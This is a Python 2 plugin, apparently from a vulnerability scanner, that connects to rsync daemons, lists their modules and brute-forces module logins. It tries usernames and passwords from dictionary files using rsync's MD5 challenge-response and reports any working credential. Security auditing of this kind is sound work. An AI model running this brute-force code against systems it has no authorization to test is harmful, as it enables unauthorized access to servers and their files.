import hashlib
import socket
import struct
import base64
import time

def assign(service, arg):
	if service == 'rsync':
		return True, arg

def audit(arg):
	host = arg[0]
	port = arg[1]
	res = initialisation(host, port)
	if res[0]:
		if float(res[2]) < 30.0:
			return
		for i in range(len(res[3]) - 1):
			ClientCommand(host, port, res[3][i])

def initialisation(host, port):
	flag = False
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	rsync = {'MagicHeader': '@RSYNCD:', 'HeaderVersion': ' 30.0'}
	payload = struct.pack('!8s5ss', rsync['MagicHeader'], rsync['HeaderVersion'], '\n')
	try:
		socket.setdefaulttimeout(20)#
		s.connect((host, port))
		s.send(payload)
		data = s.recv(1024)
		reply = struct.unpack('!8s5ss', data)
		if len(reply) == 3:
			flag = True
			rsynclist = ClientQuery(s)
	except Exception:
		pass
	finally:
		s.close()
	if flag:
		return True, reply[0], reply[1], rsynclist
	return False, 'port not open'

def ClientQuery(socket_pre):
	s = socket_pre
	payload = struct.pack('!s', '\n')
	modulelist = []
	try:
		s.send(payload)
		while True:
			data = s.recv(1024)
			moduletemp = struct.unpack('!' + str(len(data)) + 's',data)
			modulename = moduletemp[0].replace(' ', '').split('\n')
			for i in range(len(modulename)):
				realname = modulename[i].split('\t')
				if realname[0] != '':
					modulelist.append(realname[0])
			if modulename[-2] == '@RSYNCD:EXIT':
				break
	except Exception:
		pass
	return modulelist

def ClientCommand(host, port, cmd):
	global userlist,pwdlist
	rsync = {'MagicHeader': '@RSYNCD:', 'HeaderVersion': ' 30.0'}
	payload1 = struct.pack('!8s5ss', rsync['MagicHeader'], rsync['HeaderVersion'], '\n')
	payload2 = '%s\n' % cmd
	pass_list = util.load_password_dict(host, userfile='database/rsync_user.txt', passfile='database/ssh_pass.txt')
	for useri, pwdj in pass_list:
		try:
			user = useri
			password = pwdj
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((host, port))
			s.send(payload1)
			s.recv(1024)
			s.send(payload2)
			data = s.recv(1024)
			challenge = data[18:-1]
			md = hashlib.md5()
			md.update(password)
			md.update(challenge)
			auth_send_data = base64.encodestring(md.digest())
			payload3 = '%s %s\n' % (user, auth_send_data[:-3])

			s.send(payload3)
			data3 = s.recv(1024)
			s.close()
			if 'OK' in data3: 
				if password == '':
					security_hole('%s:%d rsync password is %s/<empty>' %(host, port, user))
				else:
					security_hole('%s:%d rsync password is %s/%s' % (host, port, user, password))
				return
		except Exception, e:
			pass
		finally:
			s.close()